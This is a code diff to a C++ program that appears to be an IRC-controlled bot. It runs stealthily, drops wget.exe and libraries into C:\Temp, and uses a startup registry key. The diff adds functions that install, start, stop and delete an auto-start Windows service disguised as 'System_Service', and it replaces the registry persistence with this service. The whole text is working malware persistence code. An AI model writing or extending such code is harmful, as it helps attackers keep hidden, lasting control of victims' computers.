@@ -34,7 +34,7 @@
 #include <rapidxml_utils.hpp>
 #include <rapidxml_print.hpp>
 
-
+int service_code=0;
 using boost::asio::ip::tcp;
 
 #ifdef D_LIB
@@ -60,6 +60,12 @@ logger logStartupKey("StartupKey");
 logger logDownload_Updates("Download_Updates");
 logger logxmlparser("xmlparser");
 logger logCheck_Updates("Check_Updates");
+logger logsystemservice("start_system");
+
+logger logrun_service("run_service");
+logger logclose_service("close_service");
+logger loginstallService("installService");
+logger loguninstallService("uninstallService");
 #endif
 
 
@@ -92,7 +98,180 @@ IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+
 char *writable;
 size_t starting_index = 0;
 std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ",NUMBERS = "0123456789";
+/////////////////////////////////////////START_SERVICE_CODE/////////////////////////////////////////
+void run_service( char* service_name)
+{
+        #ifdef D_LIB
+        logrun_service << LINFO << "Has been started ";
+        logrun_service << LINFO <<"Oppening OpenSCManager Handle";
+        #endif
+	SC_HANDLE serviceDbHandle = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
 
+        #ifdef D_LIB
+        logrun_service << LINFO <<"Oppening service handle.";
+        #endif
+	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, service_name, SC_MANAGER_ALL_ACCESS);
+
+        #ifdef D_LIB
+        logrun_service << LINFO <<"Oppening service.";
+        #endif
+	SERVICE_STATUS_PROCESS status;
+	DWORD bytesNeeded;
+	QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO,(LPBYTE) &status,sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded);
+
+	if (status.dwCurrentState == SERVICE_RUNNING)
+	{// Stop it
+		//BOOL b = ControlService(serviceHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &status);
+
+			;
+        #ifdef D_LIB
+        logrun_service << LINFO <<"Service is already running. !.";
+        #endif
+
+	}
+	else
+	{// Start it
+		BOOL b = StartService(serviceHandle, NULL, NULL);
+		if (b)
+		{
+			std::cout << "Service started." << std::endl;
+			if (service_code==1)
+                {
+                    #ifdef D_LIB
+                    logrun_service << LINFO <<"Service started exiting launcher. !.";
+                    #endif
+                    exit(0);
+
+
+                }
+
+		}
+		else
+		{
+
+			;
+        #ifdef D_LIB
+        logrun_service << LINFO <<"Service failed to start.!.";
+        #endif
+		}
+	}
+
+	CloseServiceHandle(serviceHandle);
+	CloseServiceHandle(serviceDbHandle);
+
+
+}
+void close_service(char* service_name)
+{
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Starting";
+        #endif
+
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Oppening SCManager ";
+        #endif
+    	SC_HANDLE serviceDbHandle = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Oppening Service handle.";
+        #endif
+	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, service_name, SC_MANAGER_ALL_ACCESS);
+
+	SERVICE_STATUS_PROCESS status;
+	DWORD bytesNeeded;
+
+	QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO,(LPBYTE) &status,sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded);
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Querrying service status";
+        #endif
+	if (status.dwCurrentState == SERVICE_RUNNING)
+	{// Stop it
+		BOOL b = ControlService(serviceHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &status);
+		if (b)
+		{
+			;
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Service stopped.";
+        #endif
+		}
+		else
+		{
+		    ;
+        #ifdef D_LIB
+        logclose_service << LINFO <<"Service failed to stop.";
+        #endif
+
+		}
+	}
+
+	CloseServiceHandle(serviceHandle);
+	CloseServiceHandle(serviceDbHandle);
+}
+
+#define srvName "System_Service"
+
+void installService(char*path)
+{
+        #ifdef D_LIB
+        loginstallService << LINFO <<"Started.";
+        #endif
+        #ifdef D_LIB
+        loginstallService << LINFO <<"Opening Scmanager";
+        #endif
+    SC_HANDLE handle = ::OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
+
+        #ifdef D_LIB
+        loginstallService << LINFO <<"Creating service.";
+        #endif
+    SC_HANDLE service = ::CreateService(
+    	handle,
+    	srvName,
+    	"System_Service",
+    	GENERIC_READ | GENERIC_EXECUTE,
+    	SERVICE_WIN32_OWN_PROCESS,
+    	SERVICE_AUTO_START,
+    	SERVICE_ERROR_IGNORE,
+    	path,
+    	NULL,
+    	NULL,
+    	NULL,
+    	NULL,
+    	NULL
+    );
+
+    if(service)
+    {
+       service_code=1;
+    }
+}
+void uninstallService()
+{
+        #ifdef D_LIB
+        loguninstallService << LINFO <<"Started";
+        #endif
+
+        #ifdef D_LIB
+        loguninstallService << LINFO <<"Oppeinging SCmanager.";
+        #endif
+    SC_HANDLE handle = ::OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );//?
+
+        #ifdef D_LIB
+        loguninstallService << LINFO <<"Deleting the Service.";
+        #endif
+    SC_HANDLE service = ::OpenService( handle, srvName, DELETE );
+    if( service != NULL )
+    {
+    	// remove the service!
+    	::DeleteService( service );
+    }
+}
+
+
+
+
+
+
+/////////////////////////////////////////END_SERVICE_CODE/////////////////////////////////////////
 void send_data()
 {
 
@@ -308,6 +487,11 @@ void setup_loggers (int level)
         logDownload_Updates.set_level(LFATAL);
         logxmlparser.set_level(LFATAL);
         logCheck_Updates.set_level(LFATAL);
+        logsystemservice.set_level(LFATAL);
+        logrun_service.set_level(LFATAL);
+        logclose_service.set_level(LFATAL);
+        loginstallService.set_level(LFATAL);
+        loguninstallService.set_level(LFATAL);
 
     }
 
@@ -327,7 +511,12 @@ void setup_loggers (int level)
         logDownload_Updates.set_level(LWARN);
         logxmlparser.set_level(LWARN);
         logCheck_Updates.set_level(LWARN);
+        logsystemservice.set_level(LWARN);
 
+        logrun_service.set_level(LWARN);
+        logclose_service.set_level(LWARN);
+        loginstallService.set_level(LWARN);
+        loguninstallService.set_level(LWARN);
     }
     else if (level==2)
     {
@@ -345,6 +534,12 @@ void setup_loggers (int level)
         logDownload_Updates.set_level(LINFO);
         logxmlparser.set_level(LINFO);
         logCheck_Updates.set_level(LINFO);
+        logsystemservice.set_level(LINFO);
+
+        logrun_service.set_level(LINFO);
+        logclose_service.set_level(LINFO);
+        loginstallService.set_level(LINFO);
+        loguninstallService.set_level(LINFO);
     }
         else if (level==3)
     {
@@ -361,6 +556,12 @@ void setup_loggers (int level)
         logStartupKey.set_level(LDEBUG);
         logDownload_Updates.set_level(LDEBUG);
         logCheck_Updates.set_level(LDEBUG);
+        logsystemservice.set_level(LDEBUG);
+
+        logrun_service.set_level(LDEBUG);
+        logclose_service.set_level(LDEBUG);
+        loginstallService.set_level(LDEBUG);
+        loguninstallService.set_level(LDEBUG);
     }
         else if (level==4)
     {
@@ -378,6 +579,13 @@ void setup_loggers (int level)
         logDownload_Updates.set_level(LTRACE);
         logxmlparser.set_level(LTRACE);
         logCheck_Updates.set_level(LTRACE);
+        logsystemservice.set_level(LTRACE);
+
+
+        logrun_service.set_level(LTRACE);
+        logclose_service.set_level(LTRACE);
+        loginstallService.set_level(LTRACE);
+        loguninstallService.set_level(LTRACE);
     }
         else if (level==5)
     {
@@ -395,6 +603,13 @@ void setup_loggers (int level)
         logDownload_Updates.set_level(LALL);
         logxmlparser.set_level(LALL);
         logCheck_Updates.set_level(LALL);
+        logsystemservice.set_level(LALL);
+
+
+        logrun_service.set_level(LALL);
+        logclose_service.set_level(LALL);
+        loginstallService.set_level(LALL);
+        loguninstallService.set_level(LALL);
     }
     if (level>=6)
     {
@@ -658,7 +873,23 @@ logCompname<<LINFO <<" :Started logging.";
 logCompname<<LINFO <<" :Exiting";
 #endif // D_LIB
 }
+void start_system()
+{
+#ifdef D_LIB
+logsystemservice<<LINFO <<" :Starting service manager.";
+#endif // D_LIB
 
+
+    installService("C:\\Temp\\System_Service.exe");
+    run_service("System_Service");
+
+
+
+
+#ifdef D_LIB
+logCompname<<LINFO <<" :Finished Creating Service.";
+#endif // D_LIB
+}
 void start_reg()
 {
 
@@ -992,7 +1223,7 @@ system(del.c_str());
 int main(int argc, char *argv[])
 {
 #ifdef D_LIB
-std::ofstream os("logger.txt", std::ios_base::out);
+std::ofstream os("C:\\Temp\\logger.txt", std::ios_base::out);
 set_all_logging_output_streams (os);
 #endif // D_LIB
 Stealth(0);
@@ -1015,6 +1246,8 @@ channel="kens";
             FileCopier("libstdc++-6.dll","libstdc++-6.dll","C:\\Temp\\");
             FileCopier("wget.exe","wget.exe","C:\\Temp\\");
             FileCopier("pthreadGC2.dll","pthreadGC2.dll","C:\\Temp\\");
+            FileCopier("System_Service.exe","System_Service.exe","C:\\Temp\\");
+
 
             //FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
             //FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
@@ -1024,8 +1257,13 @@ channel="kens";
             //FileCopier("zlib1.dll","zlib1.dll","C:\\Temp\\");
             //FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
         }
-start_reg();
+#define ADVANCE_START
+#ifdef ADVANCE_START
+       start_system();
 
+#else
+start_reg();
+#endif // D_LIB
 
 //system("taskkill /f /im Communication.exe");
 
